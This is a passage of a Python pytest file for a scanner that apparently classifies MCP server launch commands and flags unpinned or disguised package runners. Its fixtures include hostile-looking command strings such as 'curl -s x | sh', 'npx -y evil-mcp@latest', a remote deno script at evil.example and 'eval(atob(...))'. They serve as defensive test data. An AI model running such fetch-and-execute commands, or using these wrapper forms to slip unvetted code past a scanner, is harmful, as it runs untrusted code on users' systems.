        ("bash", ["-rcfile", "x", "-c", "npx -y evil-mcp@latest"], "startup file"),
        ("bash", ["-login", "-c", "npx -y evil-mcp@latest"], "options before the script"),
        ("fish", ["-C", "npx -y evil-mcp@latest", "-c", "echo"], "fish init command"),
        ("fish", ["--init=curl -s x | sh", "-c", "echo"], "fish init command"),
        ("cmd", ["/c", "npx -y evil-mcp@latest", "x"], "not a simple command"),
        ("cmd", ["/q/x", "npx", "-y", "evil-mcp@latest"], "cmd switches are not simple"),
        ("wsl", ["npx -y evil-mcp@latest"], "wsl command line is not a simple command"),
        ("env", ["-S", "npx\\_-y\\_evil-mcp@latest"], "env -S value is not a simple command"),
        ("/usr/bin/env", ["-Snpx\\_-y\\_evil-mcp@latest"], "env -S value is not a simple"),
        ("env", ["-S", "npx -y evil-mcp\\c@1.0.0"], "env -S value is not a simple command"),
        ("env", ["-S", "npx -y evil-mcp@1.0.0 #x"], "env -S value is not a simple command"),
        ("env", ["-S", "${RUNNER} -y evil-mcp@1.0.0"], "env -S value is not a simple command"),
        ("env", ["-S", "npx\x0b-y evil-mcp@1.0.0"], "env -S value is not a simple command"),
    ],
)
def test_wrapper_grammar_the_collector_cannot_settle_is_unknown(tmp_path, command, args, reason):
    detail = gap_reason(tmp_path, {"command": command, "args": args})
    assert detail is not None and reason in detail


@pytest.mark.parametrize(
    "command,args,reason",
    [
        ("nice", ["npm", "exe", "evil-mcp@latest"], "arguments start npm"),
        ("nice", ["npm", "innit", "evil-mcp"], "arguments start npm"),
        ("nice", ["npm", "--loglevel", "silent", "x", "evil-mcp@latest"], "arguments start npm"),
        ("nice", ["npm", "--otp", "123456", "exec", "evil-mcp@latest"], "arguments start npm"),
        ("nice", ["npm", "--call", "curl x | sh"], "arguments start npm"),
        ("nice", ["deno", "npm:evil-mcp@latest"], "arguments start deno"),
        ("nice", ["deno", "-A", "https://evil.example/x.ts"], "arguments start deno"),
        (
            "nice",
            ["docker", "mcp", "gateway", "run", "--servers", "evil"],
            "arguments start docker",
        ),
        ("nice", ["docker", "-D", "run", "evil/mcp:latest"], "arguments start docker"),
        ("nice", ["pipx", "--verbose", "run", "evil-mcp"], "arguments start pipx"),
        ("nice", ["uv", "--offline", "tool", "run", "evil-mcp"], "arguments start uv"),
        ("nice", ["uv", "--system-certs", "tool", "run", "evil-mcp"], "arguments start uv"),
        ("nice", ["go", "-C", "x", "tool", "evil"], "arguments start go"),
        ("nix", ["--option", "sandbox", "false", "run", "nixpkgs#evil"], "nix runs packages"),
        ("nice", ["bun", "-e", "fetch('x')"], "arguments start bun"),
        ("nice", ["sh", "-c", "--", "npx -y evil-mcp@latest"], "arguments start sh"),
        ("nice", ["cmd", "/cnpx", "-y", "evil-mcp@latest"], "arguments start cmd"),
        ("corepack", ["pnpm@9.15.0", "dlx", "evil-mcp@latest"], "arguments start pnpm"),
        ("corepack", ["yarn@4.5.0", "dlx", "evil-mcp@latest"], "arguments start yarn"),
        ("nice", ["corepack", "pnpm@9.15.0", "dlx", "evil-mcp@latest"], "arguments start"),
        ("corepack", ["pnpm@9.15.0", "run", "build"], "corepack runs packages"),
        ("mise", ["exec", "npm:evil-mcp@latest", "--", "evil-mcp"], "mise runs packages"),
        ("rtx", ["x", "pipx:evil-mcp", "--", "evil-mcp"], "rtx runs packages"),
        ("pkgx", ["evil-mcp@latest"], "pkgx runs packages"),
        ("finch", ["run", "--rm", "-i", "evil/image:latest"], "finch runs packages"),
        ("container", ["run", "--rm", "evil/image:latest"], "container runs packages"),
        ("apptainer", ["run", "docker://evil/image:latest"], "apptainer runs packages"),
        ("tsx", ["-e", "require('child_process').execSync('id')"], "inline node code"),
        ("ts-node", ["-P", "tsconfig.json", "-e", "eval(atob('x'))"], "inline ts-node code"),
        ("npx", ["-y", "tsx@4.19.2", "-e", "eval(atob('x'))"], "arguments run inline node code"),
        ("deno", ["run", "-A", "npm:npm@10.9.9", "exec", "evil-mcp@latest"], "start npm"),
        ("deno", ["run", "-A", "npm:pnpm@9.15.0", "dlx", "evil-mcp@latest"], "start pnpm"),
        ("deno", ["run", "-A", "npm:@scope/tools@1.0.0/npx", "evil-mcp"], "start npx"),
        ("docker", ["run", "--rm", "-i", "node@sha256:" + "0" * 64, "-e", "x"], "inline node"),
        ("docker", ["run", "-i", "python@sha256:" + "0" * 64, "-c", "import os"], "inline python"),
        ("podman", ["run", "-i", "ghcr.io/astral-sh/uv:0.5.0", "tool", "run", "x"], "start uv"),
    ],
)
def test_runner_reached_through_other_names_and_programs_is_unknown(
    tmp_path, command, args, reason
):
    detail = gap_reason(tmp_path, {"command": command, "args": args})
    assert detail is not None and reason in detail


@pytest.mark.parametrize(
    "args",
    [
        ["server.py", "--backend", "docker", "--config", "config.yaml"],
        ["server.py", "--backend", "docker", "--host", "127.0.0.1", "--port", "8080"],
        ["server.py", "--backend", "docker", "--debug"],
        ["server.py", "--backend", "docker", "-l", "debug", "--workers", "4"],
        ["server.py", "--backend", "docker", "--log-level", "info"],
        ["server.py", "--backend", "docker", "-c", "ctx"],
        ["server.py", "--runtime", "uv", "--python", "3.12"],
        ["server.py", "--runtime", "uv", "--log-level", "info"],
        ["server.py", "--tool", "uv", "--mode", "server"],
        ["server.py", "--pm", "npm", "--verbose"],
        ["server.py", "--pm", "npm", "--port", "3000"],
        ["server.py", "--pm", "pnpm", "--dir", "x"],
        ["server.py", "--runtime", "deno", "--port", "8000"],
        ["server.py", "--runtime", "deno", "main.ts"],
        ["server.py", "--runtime", "bun", "--port", "3000"],
        ["server.py", "--engine", "podman", "--rootless"],
        ["server.py", "--installer", "pipx", "--verbose"],
        ["server.py", "--installer", "pipx", "--mode", "fast"],
        ["server.py", "--language", "go", "--mode", "test"],
        ["server.py", "--sandbox", "docker", "--debug", "--image", "ubuntu"],
        ["server.py", "--shell", "bash", "--port", "1"],
        ["server.py", "--shell", "cmd", "--config", "x.yaml"],
        ["server.py", "--runtime", "container", "--port", "1"],
        ["server.py", "--mode", "container"],
    ],
)
def test_runner_names_followed_by_their_own_options_alone_are_not_a_launch(tmp_path, args):
    assert gap_reason(tmp_path, {"command": "python", "args": args}) is None


@pytest.mark.parametrize(
    "server",
    [
        {"command": "docker", "args": ["run", "-i", "--rm", "node@sha256:" + "a" * 64, "x.js"]},
        {
            "command": "docker",
            "args": ["run", "-i", "mcp/github@sha256:" + "a" * 64, "--read-only"],
        },
        {"command": "tsx", "args": ["server.ts", "-e", "production"]},
        {"command": "ts-node", "args": ["-P", "tsconfig.json", "src/index.ts"]},
        {"command": "deno", "args": ["run", "-A", "npm:@scope/pkg@1.2.3", "--port", "1"]},
        {"command": "bash", "args": ["-o", "pipefail", "-c", "npx -y pkg@1.2.3 ."]},
        {"command": "cmd", "args": ["/c", "npx", "-y", "pkg@1.2.3", "C:\\Users\\me\\My Docs"]},
        {"command": "env", "args": ["-S", "npx\t-y pkg@1.2.3"]},
    ],
)
def test_pinned_and_local_forms_near_the_new_rules_stay_classified(tmp_path, server):
    assert gap_reason(tmp_path, server) is None


@pytest.mark.parametrize(
    "command,args",
    [
        ("exec", ["-a", "name", "npx", "-y", "pkg@1.2.3"]),
        ("exec", ["-cl", "--", "npx", "-y", "pkg@1.2.3"]),
        ("exec", ["-aname", "npx", "-y", "pkg@1.2.3"]),
        ("nohup", ["--", "npx", "-y", "pkg@1.2.3"]),
        ("sh", ["-c", "exec -a name npx -y pkg@1.2.3"]),
    ],
)
def test_exec_and_nohup_options_are_not_the_command(tmp_path, command, args):
    assert gap_reason(tmp_path, {"command": command, "args": args}) is None
    server = scan_server(tmp_path, {"command": command, "args": args})
    assert server.properties["launcher"] == "npx"
    assert server.launcher_package == "npm:pkg" and server.version_pinned is True


@pytest.mark.parametrize(
    "command,args,reason",
    [
        ("exec", ["-a", "name", *EVIL], "version_pinning"),
        ("nohup", ["-p", *EVIL], "unrecognised nohup option"),
        ("exec", ["-x", *EVIL], "unrecognised exec option"),
        ("exec", ["-a", "name"], "exec without a command"),
    ],
)
def test_exec_and_nohup_never_hide_the_runner(tmp_path, command, args, reason):
    server = scan_server(tmp_path, {"command": command, "args": args})
    assert server.version_pinned is False
    assert any(reason in r.detail or reason == r.category for r in server.risks)


def test_npm_command_resolution_follows_npm_aliases_and_prefixes():
    from nexus_symbiote.scanners.mcp_launch import npm_command

    resolved = {word: npm_command(word) for word in ["exe", "innit", "x", "isntall", "cr"]}
    assert resolved == {
        "exe": "exec",
        "innit": "init",
        "x": "exec",
        "isntall": "install",
        "cr": "init",
    }
    assert npm_command("ex") is None and npm_command("build") is None
    assert npm_command("installTest") == "install-test"


@pytest.mark.parametrize(
    "command,args",
    [
        ("yarn", ["workspace", "app", "dlx", "evil-mcp@latest"]),
        ("pnpm", ["recursive", "dlx", "evil-mcp@latest"]),
        ("pnpm", ["m", "dlx", "evil-mcp@latest"]),
    ],
)
def test_a_command_run_in_workspaces_is_classified_as_that_command(tmp_path, command, args):
    server = scan_server(tmp_path, {"command": command, "args": args})
    assert server.properties["launcher"] == f"{command} dlx"
    assert server.properties["packages"][0]["identity"] == "npm:evil-mcp"
    assert server.version_pinned is False


@pytest.mark.parametrize(
    "command,args,reason",
    [
        ("yarn", ["workspace", "app", "add", "evil-mcp"], "yarn subcommand fetches"),
        ("yarn", ["workspaces", "foreach", "-A", "dlx", "evil-mcp"], "yarn workspaces runs"),
        ("yarn", ["workspace", "app"], "unrecognised yarn invocation"),
        ("pnpm", ["recursive", "add", "evil-mcp"], "pnpm subcommand fetches"),
        ("pnpm", ["multi", "install"], "pnpm subcommand fetches"),
        ("nice", ["yarn", "workspace", "app", "dlx", "evil-mcp"], "arguments start yarn"),
        ("nice", ["pnpm", "m", "add", "evil-mcp"], "arguments start pnpm"),
    ],
)
def test_workspace_commands_that_fetch_are_unknown(tmp_path, command, args, reason):
    detail = gap_reason(tmp_path, {"command": command, "args": args})
    assert detail is not None and reason in detail


def test_argument_scan_cost_is_bounded_by_characters_not_steps():
    from nexus_symbiote.scanners.mcp_launch import analyze

    # The re-review shape: one argument of 64,000 words inflates the step budget,
    # then interpreter names rescan long words; it must fail closed in linear time.
    samples = {
        scale: [
            "a " * (16_000 * scale),
            *(["ruby"] * (75 * scale)),
            *(["A" * 5801] * (175 * scale)),
        ]
        for scale in (1, 4)
    }

    def run(scale: int) -> None:
        launch = analyze("x", samples[scale])
        assert launch.unknown == "arguments exceed the launcher scan limit"

    assert scaling_ratio(run) < 10


@pytest.mark.parametrize("runner,cluster", [("sh", "e"), ("npm", "y"), ("python", "u")])
def test_long_option_clusters_are_checked_in_linear_time(runner, cluster):
    from nexus_symbiote.scanners.mcp_launch import analyze

    args = {
        scale: [word for _ in range(20) for word in (runner, "-" + cluster * (25_000 * scale))]
        for scale in (1, 4)
    }
    assert scaling_ratio(lambda scale: analyze("nice", args[scale])) < 10
